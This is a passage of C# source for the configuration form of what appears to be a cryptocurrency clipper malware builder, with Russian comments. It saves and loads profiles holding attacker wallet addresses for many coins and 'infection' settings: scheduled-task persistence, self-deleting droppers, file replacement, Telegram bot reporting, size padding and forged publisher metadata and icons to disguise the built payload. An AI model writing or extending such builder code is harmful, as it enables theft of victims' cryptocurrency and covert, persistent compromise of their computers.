                        ParsProfile(AddNECWallets, nec = readData["Wallets"]["nec"]);
                        ParsProfile(AddBCHWallets, bch = readData["Wallets"]["bch"]);
                        ParsProfile(AddDASHWallets, dash = readData["Wallets"]["dash"]);
                        ParsProfile(AddDOGEWallets, doge = readData["Wallets"]["doge"]);
                        ParsProfile(AddTRC20Wallets, trx = readData["Wallets"]["trx"]);
                        ParsProfile(AddZECWallets, zcash = readData["Wallets"]["zcash"]);
                        ParsProfile(AddBNBWallets, bnb = readData["Wallets"]["bnb"]);
                        ParsProfile(AddTONWallets, ton = readData["Wallets"]["ton"]);

                        // Читаем остальные настройки профиля, переключаем чекбоксы в нужное положение
                        // Настройки установки/заражения
                        if (readData["InstallSettings"]["INSTALL"] == "true")
                        {
                            metroToggle_Install.Checked = true;
                        }
                        else
                        {
                            metroToggle_Install.Checked = false ;
                        }

                        if (readData["InstallSettings"]["RUN_SCHEDULER"] == "true")
                        {
                            metroToggle_AutoRun_Scheduler.Checked = true;
                        }
                        else
                        {
                            metroToggle_AutoRun_Scheduler.Checked = false;
                        }

                        if (readData["InstallSettings"]["RUN_COM"] == "true")
                        {
                            metroToggle_Run_COM.Checked = true;
                        }
                        else
                        {
                            metroToggle_Run_COM.Checked = false;
                        }

                        if (readData["InstallSettings"]["DELETE"] == "true")
                        {
                            metroToggle_Delete_Source_File.Checked = true;
                        }
                        else
                        {
                            metroToggle_Delete_Source_File.Checked = false;
                        }

                        if (readData["InstallSettings"]["FILE_REPLACER"] == "true")
                        {
                            metroToggle7.Checked = true;
                            metroTextBox_FILES.Text = readData["InstallSettings"]["FILES"];
                        }
                        else
                        {
                            metroToggle7.Checked = false;
                            metroTextBox_FILES.Text = Properties.PresentationWallets.Default.fileReplaceFormated;
                        }

                        if (readData["InstallSettings"]["TG_API"] == "true")
                        {
                            metroCheckBox_TGAPI.Checked = true;
                            metroTextBox2.Text = readData["InstallSettings"]["TOKEN"];
                            metroTextBox3.Text = readData["InstallSettings"]["USER_ID"];
                        }
                        else
                        {
                            metroCheckBox_TGAPI.Checked = false;
                            metroTextBox2.Text = "";
                            metroTextBox3.Text = "";
                        }

                        if (readData["InstallSettings"]["ADDDBYTES"] == "true")
                        {
                            metroCheckBox2.Checked = true;
                            metroTextBox4.Text = readData["InstallSettings"]["ADDKB"];
                        }
                        else
                        {
                            metroCheckBox2.Checked = false;
                            metroTextBox4.Text = "750000";
                        }

                        if (readData["InstallSettings"]["ADDDBYTES_NULL"] == "true")
                        {

                            metroCheckBox1.Checked = true;
                            metroTextBox1.Text = readData["InstallSettings"]["ADDKB_NULL"];
                        }
                        else
                        {
                            metroCheckBox1.Checked = false;
                            metroTextBox1.Text = "750000";
                        }

                        metroComboBox1.SelectedIndex = int.Parse(readData["InstallSettings"]["SYSDIR"]);
                        txt_build_dir.Text = readData["InstallSettings"]["DIR"];
                        txt_build_name.Text = readData["InstallSettings"]["BIN"];
                        txt_taskName.Text = readData["InstallSettings"]["TASKNAME"];
                        txt_mutex.Text = readData["InstallSettings"]["MUTEX"];
                        txt_key.Text = readData["InstallSettings"]["KEY"];

                        // Assembly Info и иконка
                        if (readData["InstallSettings"]["Assembly"] == "true")
                        {
                            metroToggle_assembly.Checked = true;
                            txt_Product.Text = readData["InstallSettings"]["Product"];
                            txt_Description.Text = readData["InstallSettings"]["Description"];
                            txt_Company.Text = readData["InstallSettings"]["Company"];
                            txt_Copyright.Text = readData["InstallSettings"]["Copyright"];
                            txt_Trademarks.Text = readData["InstallSettings"]["Trademarks"];
                            txt_Original_Name.Text = readData["InstallSettings"]["Original_name"];
                            txt_Version.Text = readData["InstallSettings"]["Version"];
                            txt_File_Version.Text = readData["InstallSettings"]["File_Version"];
                        }
                        else
                        {
                            metroToggle_assembly.Checked = false;
                        }

                        if (readData["InstallSettings"]["ICO"] == "true")
                        {
                            metroToggle_icon_Build.Checked = true;
                            tempFileICO = readData["InstallSettings"]["ICO_PATH"];
                            if (File.Exists(tempFileICO)) 
                            { 
                                picIcon.ImageLocation = tempFileICO;
                                buildicon = tempFileICO;
                            }
                            else
                            { 
                                MessageBox.Show("File *.ico Not Found!" );
                                metroToggle_icon_Build.Checked = false;
                            }
                        }
                        else
                        {
                            metroToggle_icon_Build.Checked = false;
                        }

                        tempProfile = ofd.FileName;
                        metroLink2.Text = Path.GetFileName(tempProfile);
                        metroLink2.Style = MetroFramework.MetroColorStyle.Lime;
                    });
                }
            }
        }

        // Сохранение профиля
        public async void Save_Profile(string fileProfile)
        {
            await Task.Run(() =>
            {
                try
                {
                    // Создание парсера
                    var parser = new FileIniDataParser();
                    IniData data = new IniData();

                    // Запись кошельков
                    data["Wallets"]["btc"] = btc;
                    data["Wallets"]["bc1"] = bc1;
                    data["Wallets"]["eth"] = eth;
                    data["Wallets"]["xmr"] = xmr;
                    data["Wallets"]["xlm"] = xlm;
                    data["Wallets"]["xrp"] = xrp;
                    data["Wallets"]["ltc"] = ltc;
                    data["Wallets"]["nec"] = nec;
                    data["Wallets"]["bch"] = bch;
                    data["Wallets"]["dash"] = dash;
                    data["Wallets"]["doge"] = doge;
                    data["Wallets"]["trx"] = trx;
                    data["Wallets"]["zcash"] = zcash;
                    data["Wallets"]["bnb"] = bnb;
                    data["Wallets"]["ton"] = ton;

                    // Настройки установки/заражения
                    if (metroToggle_Install.Checked)
                    {
                        data["InstallSettings"]["INSTALL"] = "true";
                    }
                    else
                    {
                        data["InstallSettings"]["INSTALL"] = "false";
                    }

                    if (metroToggle_AutoRun_Scheduler.Checked)
                    {
                        data["InstallSettings"]["RUN_SCHEDULER"] = "true";
                    }
                    else
                    {
                        data["InstallSettings"]["RUN_SCHEDULER"] = "false";
                    }

                    if (metroToggle_Run_COM.Checked)
                    {
                        data["InstallSettings"]["RUN_COM"] = "true";
                    }
                    else
                    {
                        data["InstallSettings"]["RUN_COM"] = "false";
                    }

                    if (metroToggle_Delete_Source_File.Checked)
                    {
                        data["InstallSettings"]["DELETE"] = "true";
                    }
                    else
                    {
                        data["InstallSettings"]["DELETE"] = "false";
                    }


                    if (metroToggle7.Checked)
                    {
                        data["InstallSettings"]["FILES"] = metroTextBox_FILES.Text;
                        data["InstallSettings"]["FILE_REPLACER"] = "true";
                    }
                    else
                    {

                        data["InstallSettings"]["FILES"] = "";
                        data["InstallSettings"]["FILE_REPLACER"] = "false";
                    }

                    if (metroCheckBox_TGAPI.Checked)
                    {
                        data["InstallSettings"]["TG_API"] = "true";
                        data["InstallSettings"]["TOKEN"] = metroTextBox2.Text;
                        data["InstallSettings"]["USER_ID"] = metroTextBox3.Text;
                    }
                    else
                    {
                        data["InstallSettings"]["TG_API"] = "false";
                        data["InstallSettings"]["TOKEN"] = "";
                        data["InstallSettings"]["USER_ID"] = "";
                    }

                    if (metroCheckBox2.Checked)
                    {
                        data["InstallSettings"]["ADDDBYTES"] = "true";
                        data["InstallSettings"]["ADDKB"] = metroTextBox4.Text.Trim();
                    }
                    else
                    {
                        data["InstallSettings"]["ADDDBYTES"] = "false";
                        data["InstallSettings"]["ADDKB"] = "";
                    }

                    if (metroCheckBox1.Checked)
                    {
                        data["InstallSettings"]["ADDDBYTES_NULL"] = "true";
                        data["InstallSettings"]["ADDKB_NULL"] = metroTextBox1.Text.Trim();
                    }
                    else
                    {
                        data["InstallSettings"]["ADDDBYTES_NULL"] = "false";
                        data["InstallSettings"]["ADDKB_NULL"] = "";
                    }

                    data["InstallSettings"]["SYSDIR"] = metroComboBox1.SelectedIndex.ToString();
                    data["InstallSettings"]["DIR"] = txt_build_dir.Text;
                    data["InstallSettings"]["BIN"] = txt_build_name.Text;
                    data["InstallSettings"]["TASKNAME"] = txt_taskName.Text;
                    data["InstallSettings"]["MUTEX"] = txt_mutex.Text;
                    data["InstallSettings"]["KEY"] = txt_key.Text;

                    // Assembly Info и иконка
                    if (metroToggle_assembly.Checked)
                    {
                        data["InstallSettings"]["Assembly"] = "true";
                        data["InstallSettings"]["Product"] = txt_Product.Text;
                        data["InstallSettings"]["Description"] = txt_Description.Text;
                        data["InstallSettings"]["Company"] = txt_Company.Text;
                        data["InstallSettings"]["Copyright"] = txt_Copyright.Text;
                        data["InstallSettings"]["Trademarks"] = txt_Trademarks.Text;
                        data["InstallSettings"]["Original_name"] = txt_Original_Name.Text;
                        data["InstallSettings"]["Version"] = txt_Version.Text;
                        data["InstallSettings"]["File_Version"] = txt_File_Version.Text;

                    }
                    else
                    {
                        data["InstallSettings"]["Assembly"] = "false";
                        data["InstallSettings"]["Product"] = "";
                        data["InstallSettings"]["Description"] = "";
                        data["InstallSettings"]["Company"] = "";
                        data["InstallSettings"]["Copyright"] = "";
                        data["InstallSettings"]["Trademarks"] = "";
                        data["InstallSettings"]["Original name"] = "";
                        data["InstallSettings"]["Version"] = "";
                        data["InstallSettings"]["File Version"] = "";
                    }

                    if (metroToggle_icon_Build.Checked)
                    {
                        data["InstallSettings"]["ICO"] = "true";
                        data["InstallSettings"]["ICO_PATH"] = tempFileICO;
                    }
                    else
                    {
                        data["InstallSettings"]["ICO"] = "false";
                        data["InstallSettings"]["ICO_PATH"] = "";
                    }


                    // Сохранение настроек в файл
                    parser.WriteFile(fileProfile, data);
                    metroLink2.Text = Path.GetFileName(fileProfile);
                    metroLink2.Style = MetroFramework.MetroColorStyle.Lime;

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            });
        }


        private void metroButton1_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog ofd = new SaveFileDialog())
            {
                ofd.Title = "Save Profile .*ini";
                ofd.Filter = ".ini (*.ini)|*.ini";
                ofd.FileName = "Profile_";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    tempProfile = ofd.FileName;
                    Save_Profile(tempProfile);

                    MessageBox.Show("✅ Profile Saved\n" + tempProfile, "Successfully", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void metroCheckBox_TGAPI_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox_TGAPI.Checked)
            {
                metroTextBox2.Enabled = true;
                metroTextBox3.Enabled = true;
            }
            else
            {
                metroTextBox2.Enabled = false;
                metroTextBox3.Enabled = false;
            }
        }
    }
}
